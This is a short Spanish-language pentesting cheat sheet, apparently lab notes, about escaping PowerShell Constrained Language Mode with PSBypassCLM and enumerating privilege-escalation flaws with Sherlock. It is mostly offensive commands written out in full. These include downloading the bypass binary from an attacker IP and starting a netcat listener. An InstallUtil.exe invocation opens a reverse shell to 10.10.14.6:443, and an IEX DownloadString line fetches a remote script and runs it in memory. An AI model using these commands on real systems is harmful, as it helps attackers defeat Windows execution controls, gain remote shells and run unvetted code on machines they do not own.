** Modos de Lenguaje de la consola Powershell ** 
>Comprobar contexto de la consola Powershell
> `$executioncontext.sessionstate.languagemode`
> Constrained-Language: Modo de lenguaje de Powershell que permite comandos de tareas administrativas, pero restringe el acceso a comandos que puedan ser invocados para abrir algún Windows API.
> Cambiar modo de Lenguaje de Powershell
> `$ExecutionContext.SessionState.LanguageMode = "FullLanguage"`

** Utilidades para salir de contexto "Constrained-Language" **
> PSBypassCLM: https://github.com/padovah4ck/PSByPassCLM
> Pasar a la máquina objetivo vía http/web el archivo PsBypassCLM.exe:
> `IWR -URI http://10.10.14.6:8000/PSBypassCLM.exe -OutFile CLM.exe`
> Abrir netcat en máquina atacante:
> `rlwrap nc -nlvp 443`
> Buscar utilidad en máquina objetivo:
> `dir C:\Windows\microsoft.net\framework64`
> Ejecutar reverse shell:
> `C:\Windows\Microsot.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=True /U /revshell=true /rhost=10.10.14.6 /rport=443 C:\Users\amanda\Downloads\CLM.exe`

** Enumeración con Sherlock **
https://github.com/rasta-mouse/Sherlock

PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

Uso:
> Para ver todas las funciones del script --> `cat Sherlock.ps1 | grep "function"`
> Modificar Sherlock.ps1 para ejecutar automáticamente todas las tareas sin tener que cargar el módulo en Powershell. Modificando su última línea: `Find-AllVulns`
> Transferir archivo a máquina remota. En local:
> `python3 -m http.server`
> Desde la máquina objetivo:
> `IEX (New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/Sherlock.ps1')`
> Se ejecutará para obtener todas las vulnerabilidades asociadas al equipo.